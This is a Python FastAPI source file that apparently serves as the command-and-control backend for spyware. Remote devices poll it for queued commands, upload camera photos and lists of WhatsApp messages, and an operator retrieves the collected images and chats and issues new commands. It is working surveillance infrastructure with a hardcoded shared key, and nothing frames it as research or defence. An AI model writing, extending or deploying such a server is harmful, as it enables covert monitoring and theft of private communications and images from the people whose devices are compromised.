from fastapi import FastAPI, Request, HTTPException, UploadFile, File
import time

app = FastAPI()
API_KEY = "MY_SECRET_KEY_123" 

device_data = {} 
command_queue = []
latest_image_bytes = None # Changed to store raw bytes
latest_wa_chats = []  
debug_msg = "No debug info yet"

def check_key(request: Request):
    if request.headers.get("X-Key") != API_KEY:
        raise HTTPException(status_code=401, detail="Unauthorized")

@app.post("/cmd")
async def get_commands(request: Request):
    check_key(request)
    data = await request.json()
    device_id = data.get("device_id")
    data["last_seen"] = time.time()
    device_data[device_id] = data
    
    cmds = list(command_queue)
    command_queue.clear()
    return {"commands": cmds}

# NEW: Accept raw file uploads
@app.post("/upload_photo")
async def upload_photo(request: Request, file: UploadFile = File(...)):
    global latest_image_bytes
    check_key(request)
    latest_image_bytes = await file.read()
    print(f"PHOTO SAVED! Size: {len(latest_image_bytes)} bytes")
    return {"status": "ok"}

@app.post("/result")
async def post_result(request: Request):
    global debug_msg
    check_key(request)
    data = await request.json()
    if "debug_text" in data:
        debug_msg = data["debug_text"]
    return {"status": "ok"}

@app.post("/wa")
async def post_wa(request: Request):
    global latest_wa_chats
    check_key(request)
    data = await request.json()
    if "messages" in data:
        for msg in data["messages"]:
            latest_wa_chats.insert(0, msg)
        latest_wa_chats = latest_wa_chats[:50] 
    return {"status": "ok"}

@app.get("/state")
async def get_state(request: Request):
    check_key(request)
    now = time.time()
    active_devices = {}
    for dev_id, info in device_data.items():
        if now - info.get("last_seen", 0) < 15:
            active_devices[dev_id] = info

    return {
        "devices": active_devices,
        "has_image": latest_image_bytes is not None, # Tell controller if photo exists
        "wa_chats": latest_wa_chats,
        "debug_msg": debug_msg
    }

# NEW: Serve the image bytes to the controller
@app.get("/get_photo")
async def get_photo(request: Request):
    check_key(request)
    if latest_image_bytes is None:
        raise HTTPException(status_code=404, detail="No image")
    from fastapi.responses import Response
    return Response(content=latest_image_bytes, media_type="image/jpeg")

@app.post("/queue_cmd")
async def queue_command(request: Request):
    check_key(request)
    cmd = await request.json()
    command_queue.append(cmd)
    return {"status": "queued"}
